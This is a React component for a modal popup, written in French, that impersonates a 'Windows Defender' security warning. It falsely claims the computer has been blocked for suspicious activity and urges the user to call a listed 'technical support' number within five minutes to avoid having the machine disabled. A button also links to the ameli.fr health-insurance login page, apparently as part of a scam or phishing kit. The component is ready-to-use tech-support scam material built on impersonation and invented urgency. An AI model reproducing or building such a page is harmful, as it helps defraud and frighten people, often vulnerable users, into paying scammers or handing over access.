import React from 'react'
import './PopUp.css'
function PopUp() {
 
  
  return (
    <div> 
	<a href="#myModal" className="r_btsubmit" data-toggle="modal">CONTINUER</a>
<div id="myModal" className="modal fade">
	<div className="modal-dialog modal-confirm">
		<div className="modal-content">
			<div className='modal-container'>
			<div className="modal-header">
				<img className='img-modal' src="https://img1.freepng.fr/20180604/vkk/kisspng-windows-xp-windows-vista-service-pack-5b1559e0ad7e27.1379743715281259207106.jpg"/>
				{/* <div className="icon-box">
					<i className="material-icons">&#xE86B;</i>
					<i className="material-icons">&#xE86B;</i>
					<i className="material-icons">&#xE645;</i>
				</div> */}
				{/* <button type="button" className="close" data-dismiss="modal" aria-hidden="true"><span>&times;</span></button> */}
			</div>
			<div className="modal-body text-center">
			     <div className='danger'>
				 <i class=" triangle fas fa-exclamation-triangle"></i>
				 <h4>Windows Defender <br></br> avertissement de sécurité</h4>	
				 </div>
				
				<p className='pop-up-text'>Windows a été bloqué en raison de de l’activité douteuse.<br></br>
                Veuiller nous appeler dans les 5 prochaines minutes pour <br></br>éviter que votre ordinateur ne soit désactivé.<br></br>
                  Contacter le support technique : 09-70-18-33-56
</p>
				<button className="btn btn-primary"  href="/">Exécuter</button>
				<button className=" red btn btn-primary"  href="https://assure.ameli.fr:443/PortailAS/appmanager/PortailAS/assure?_nfpb=true&amp;_pageLabel=as_login_page&amp;connexioncompte_2actionEvt=afficher">Retourner</button>
			</div>
			</div>
		</div>
	</div>
</div>     
    </div>
  )
}

export default PopUp